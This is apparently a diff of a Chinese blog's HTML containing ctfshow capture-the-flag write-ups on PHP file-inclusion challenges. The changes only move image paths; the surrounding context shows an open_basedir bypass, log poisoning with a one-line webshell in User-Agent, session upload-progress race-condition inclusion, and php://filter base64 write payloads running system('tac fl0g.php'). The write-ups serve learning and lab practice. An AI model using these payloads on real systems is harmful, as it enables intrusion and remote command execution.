 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bypass_open_basedir</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;bypass_open_basedir&#x27;</span>))&#123;</span><br><span class="line">                <span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;bypass_open_basedir&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;bypass_open_basedir&#x27;</span>);</span><br><span class="line">        @<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">        <span class="comment">//echo @ini_get(&quot;open_basedir&quot;);</span></span><br><span class="line">        @<span class="variable">$_Ei34Ww_sQDfq_FILENAME</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>]);</span><br><span class="line">        <span class="comment">// echo $_Ei34Ww_sQDfq_FILENAME;</span></span><br><span class="line">        @<span class="variable">$_Ei34Ww_sQDfq_path</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\\&quot;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="variable">$_Ei34Ww_sQDfq_FILENAME</span>);</span><br><span class="line">        @<span class="variable">$_Ei34Ww_sQDfq_num</span> = <span class="title function_ invoke__">substr_count</span>(<span class="variable">$_Ei34Ww_sQDfq_path</span>,<span class="string">&#x27;/&#x27;</span>)-<span class="number">1</span>;</span><br><span class="line">        <span class="comment">//echo $_Ei34Ww_sQDfq_num;</span></span><br><span class="line">        <span class="variable">$_Ei34Ww_sQDfq_i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$_Ei34Ww_sQDfq_i</span> &lt; <span class="variable">$_Ei34Ww_sQDfq_num</span>)&#123;</span><br><span class="line">                @<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">                <span class="variable">$_Ei34Ww_sQDfq_i</span>++;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//@ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);</span></span><br><span class="line">@<span class="title function_ invoke__">rmdir</span>(<span class="variable">$_Ei34Ww_sQDfq_FILENAME</span>.<span class="string">&#x27;/&#x27;</span>.<span class="string">&#x27;bypass_open_basedir&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">1234567891011121314151617181920</span></span><br></pre></td></tr></table></figure>
 
 <p>只跳两次目录，当前的目录为<code>www</code>,<code>open_basedir</code>为<code>..</code>即<code>var</code>。此时我们应该无法查看其他目录。</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/467e9049032a29bc4281ee3d828c4339.png" class="" title="在这里插入图片描述"></li>
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/467e9049032a29bc4281ee3d828c4339.png" class="" title="在这里插入图片描述"></li>
 </ol>
 </blockquote>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">题目给出的hint:</span><br><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>); <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>) &#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);&#125; <span class="keyword">exit</span>(<span class="number">0</span>); <span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//注意空格</span></span><br><span class="line"><span class="comment">//通过这个发现flag在flag0.txt</span></span><br><span class="line"><span class="comment">//之后利用uaf的脚本进行命令执行</span></span><br></pre></td></tr></table></figure>
 
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line">	<span class="comment"># 利用DirectoryIterator($path)可以实现遍历目录下的所有文件</span></span><br><span class="line">	<span class="comment"># glob://  查找匹配的文件路径模式</span></span><br><span class="line">	<span class="comment"># DirectoryIterator(&quot;glob:///*&quot;)   遍历根目录里所有文件</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;  	<span class="comment">#循环遍历输出，并以空格为分隔</span></span><br><span class="line">    <span class="keyword">echo</span> (<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__tostring</span>().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/56cde5e920c7481aacbda718741b1529.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/56cde5e920c7481aacbda718741b1529.png" class="" title="在这里插入图片描述">
 
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">其实不加前面<span class="meta">?&gt;</span><span class="meta">&lt;?php</span>也是可以的。<span class="keyword">eval</span>里的语句可以视为在当前php文件里加了几条语句，这些语句必须是完整的，即必须以;或者<span class="meta">?&gt;</span>结尾来结束语句，但是<span class="keyword">eval</span>里的<span class="meta">?&gt;</span>不会闭合当前的php文件，所以当前php页面后续的语句都是会执行的。</span><br><span class="line"></span><br><span class="line">可以看一下下面的图片，<span class="keyword">eval</span>里的语句可以修改文件的变量值，但是<span class="meta">?&gt;</span>并不会闭合外面的PHP语句。</span><br></pre></td></tr></table></figure>
 
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/4a3e6e03ecae4326b01bfa7e16d1fbab.png" class="" title="在这里插入图片描述">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/4a3e6e03ecae4326b01bfa7e16d1fbab.png" class="" title="在这里插入图片描述">
 
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">接下来是ctfshow 提供的这道题的poc（一个绕过安全目录的脚本）：说是利用了 php的垃圾回收，代码啃了一部分后面实在啃不动了，涉及到偏移地址之类的，那些数值不知道具体指向。（以后再研究吧）</span><br><span class="line"></span><br><span class="line">这个脚本一般情况过下应该是可以直接使用，要求被攻击服务器必须是类unix系统，没有什么容易被过滤的函数，可能会被过滤的<span class="title function_ invoke__">strlen</span>()在脚本中也只是起到判断作用，可以调整修改的。</span><br></pre></td></tr></table></figure>
 
@@ -750,22 +750,22 @@
 
 <blockquote>
 <p>php和data都无法使用，同样可以使用上题的方法进行大小写绕过，这题可以采用包含日志文件的方法，得知服务器为nginx</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240423170040942.png" class="" title="image-20240423170040942">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240423170040942.png" class="" title="image-20240423170040942">
 
 <p>输入?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log，并使用BP抓包，得到响应中都是User-Agent的信息</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240423170507132.png" class="" title="image-20240423170507132">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240423170507132.png" class="" title="image-20240423170507132">
 
 <p>那么可以在User-Agent中写入一句话木马，重新抓一个初始页面的包，并写入一句话木马，放包</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240423170721357.png" class="" title="image-20240423170721357">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240423170721357.png" class="" title="image-20240423170721357">
 
 <p>再次访问&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log，并在POST中提交1&#x3D;system(“ls”);</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240423170908272.png" class="" title="image-20240423170908272">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240423170908272.png" class="" title="image-20240423170908272">
 
 <p>得到信息fl0g.php</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240423171058360.png" class="" title="image-20240423171058360">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240423171058360.png" class="" title="image-20240423171058360">
 
 <p>再在POST中提交1&#x3D;system(“tac fl0g.php”);，得到flag</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240423171152820.png" class="" title="image-20240423171152820">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240423171152820.png" class="" title="image-20240423171152820">
 </blockquote>
 <h2 id="web81（日志文件包含）"><a href="#web81（日志文件包含）" class="headerlink" title="web81（日志文件包含）"></a>web81（日志文件包含）</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -777,9 +777,9 @@
 
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. session.upload_progress.enabled = on</span><br><span class="line"><span class="number">2</span>. session.upload_progress.cleanup = on（默认开启）</span><br><span class="line"><span class="number">3</span>. session.upload_progress.prefix = <span class="string">&quot;upload_progress_&quot;</span>（默认）</span><br><span class="line"><span class="number">4</span>. session.upload_progress.name = <span class="string">&quot;<span class="subst">$PHP_SESSION_UPLOAD_PROGRESS</span>&quot;</span>（默认）</span><br><span class="line"></span><br><span class="line">enabled=on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中；</span><br><span class="line"></span><br><span class="line">cleanup=on表示当文件上传结束后，php将会立即清空对应session文件中的内容；</span><br><span class="line"></span><br><span class="line">name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控也就是PHP_SESSION_UPLOAD_PROGRESS的值可控；</span><br><span class="line"></span><br><span class="line">prefix+name将表示为session中的键名，</span><br></pre></td></tr></table></figure>
 
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVFQxM1VH,size_20,color_FFFFFF,t_70,g_se,x_16.png" class="" title="img">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVFQxM1VH,size_20,color_FFFFFF,t_70,g_se,x_16.png" class="" title="img">
 
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAX01vbmljYV8=,size_20,color_FFFFFF,t_70,g_se,x_16.png" class="" title="img">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAX01vbmljYV8=,size_20,color_FFFFFF,t_70,g_se,x_16.png" class="" title="img">
 
 <blockquote>
 <p>大体思路为：</p>
@@ -792,7 +792,7 @@
 <blockquote>
 <p>我们能够创建session文件的原因：session里有一个默认选项，session.use_strict_mode默认值为off。也就是说此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID&#x3D;aaa，PHP将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_aaa”。即使此时用户没有初始化Session，PHP也会自动初始化Session,并产生一个键值。这个键值ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_aaa文件里。</p>
 </blockquote>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/2c742e3c27505584b017b93285ffd524.png" class="" title="img">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/2c742e3c27505584b017b93285ffd524.png" class="" title="img">
 
 <blockquote>
 <p>注：在Linux系统中，session文件一般的默认存储位置为</p>
@@ -803,7 +803,7 @@
 <p>&#x2F;tmp&#x2F;sessions&#x2F;</p>
 <p>本题型一律采用&#x2F;tmp形式</p>
 </blockquote>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/3933add971247ac1e611cccf0c9dc5be.png" class="" title="img">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/3933add971247ac1e611cccf0c9dc5be.png" class="" title="img">
 
 <blockquote>
 <p>但是<strong>session.upload_progress.cleanup</strong>默认是开启的，一旦读取了所有POST数据，它就会清除进度信息，把我们session文件里的内容全部删除。所以这里我们需要利用条件竞争来读取session文件。</p>
@@ -815,7 +815,7 @@
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://ffa3a732-3c6b-4e9e-a1aa-7577baada547.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 </li>
 <li><p>修改上传文件包</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240423175022686.png" class="" title="image-20240423175022686">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240423175022686.png" class="" title="image-20240423175022686">
 
 <blockquote>
 <p> 注意两点：</p>
@@ -824,19 +824,19 @@
 </blockquote>
 </li>
 <li><p>包含session文件，抓包</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240423175435658.png" class="" title="image-20240423175435658">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240423175435658.png" class="" title="image-20240423175435658">
 
 <blockquote>
 <p>这里§a§是为了爆破payload用</p>
 </blockquote>
 </li>
 <li><p>进行爆破，将两个爆破的设置都改为null payloads，然后一起爆破（先对上传文件包点击attack，在对&#x2F;tmp&#x2F;sess_flag文件包含包点击attack，也可以不管顺序，因为爆破次数有很多)</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240423180028881.png" class="" title="image-20240423180028881">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240423180028881.png" class="" title="image-20240423180028881">
 
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240423181207898.png" class="" title="image-20240423181207898">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240423181207898.png" class="" title="image-20240423181207898">
 
 <p>再讲指令改为system(“tac fl0g.php”);即可拿到flag</p>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240423181321645.png" class="" title="image-20240423181321645"></li>
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240423181321645.png" class="" title="image-20240423181321645"></li>
 </ul>
 </li>
 <li><p>脚本方法</p>
@@ -845,9 +845,9 @@
 <blockquote>
 <p>出现+号后然后访问url&#x2F;tao.php。post传参2&#x3D;system(‘tac fl0g.php’); </p>
 </blockquote>
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240424120547842.png" class="" title="image-20240424120547842">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240424120547842.png" class="" title="image-20240424120547842">
 
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240424120700984.png" class="" title="image-20240424120700984"></li>
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240424120700984.png" class="" title="image-20240424120700984"></li>
 </ol>
 <h2 id="web83"><a href="#web83" class="headerlink" title="web83"></a>web83</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_unset</span>();</span><br><span class="line"><span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">session_unset() 函数用于删除会话中存储的所有数据，而 session_destroy() 函数则用于销毁会话。这两个函数通常一起使用，以确保清除会话数据并终止会话。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -1009,7 +1009,7 @@
 </blockquote>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">根据上面的方法构造POC：</span><br><span class="line">?file=php:<span class="comment">//filter/write=convert.base64-decode/resource=1.php</span></span><br><span class="line">再用urlencode编码两次</span><br><span class="line">?file=%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span></span><br><span class="line">再在post提交content=aaPD9waHAgc3lzdGVtKCJ0YWMgZmwwZy5waHAiKTs/Pg==</span><br><span class="line"><span class="comment">//content=aa&lt;?php system(&quot;tac fl0g.php&quot;);?&gt;</span></span><br><span class="line">在前面加两个a的原因是，题中给出的<span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line">除了phpdie，都不会被base64所解析，而为了补齐八位，需要补两个a</span><br><span class="line">提交content后，在<span class="number">1</span>.php中写入的内容如下：</span><br><span class="line">phpdieaaPD9waHAgc3lzdGVtKCJ0YWMgZmwwZy5waHAiKTs/Pg==</span><br><span class="line">再被file中的base64-decode解码一下得到想要执行的命令</span><br><span class="line">最后访问<span class="number">1</span>.php，即可得到flag</span><br></pre></td></tr></table></figure>
 
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240424140701431.png" class="" title="image-20240424140701431">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240424140701431.png" class="" title="image-20240424140701431">
 
 <p>前面的乱码即为aaphpdie被base64解码后得到的结果</p>
 <h2 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -1018,13 +1018,13 @@
 
 <h2 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">有个视频下载下来，然后使用foremost分离得到一张png图片</span><br></pre></td></tr></table></figure>
 
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240424154119198.png" class="" title="image-20240424154119198">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240424154119198.png" class="" title="image-20240424154119198">
 
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240424154140653.png" class="" title="image-20240424154140653">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240424154140653.png" class="" title="image-20240424154140653">
 
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">得到参数file可以传参</span><br></pre></td></tr></table></figure>
 
-<img src="/2024/06/09/ctfshow%E9%A2%98%E8%A7%A3/image-20240424154511339.png" class="" title="image-20240424154511339">
+<img src="/2024/04/02/ctfshow%E9%A2%98%E8%A7%A3/image-20240424154511339.png" class="" title="image-20240424154511339">
 
 <p>拿到flag</p>
 <h2 id="web117（ucs-2过滤器）"><a href="#web117（ucs-2过滤器）" class="headerlink" title="web117（ucs-2过滤器）"></a>web117（ucs-2过滤器）</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="variable">$contents</span>);</span><br></pre></td></tr></table></figure>
@@ -1142,7 +1142,7 @@
 <p>而当你对这个目录进行迭代操作时，<code>DirectoryIterator</code> 会遍历该目录中的所有文件和子目录。这意味着，遍历的结果会包括当前目录 <code>.</code> 和上级目录 <code>..</code>。通常，这两个特殊的目录会作为遍历结果的一部分返回，因为它们是文件系统中的标准目录表示法。</p>
 <p>所以，使用 <code>DirectoryIterator</code> 遍历目录时，默认情况下会包括 <code>.</code> 和 <code>..</code> 这两个目录项。</p>
 </blockquote>
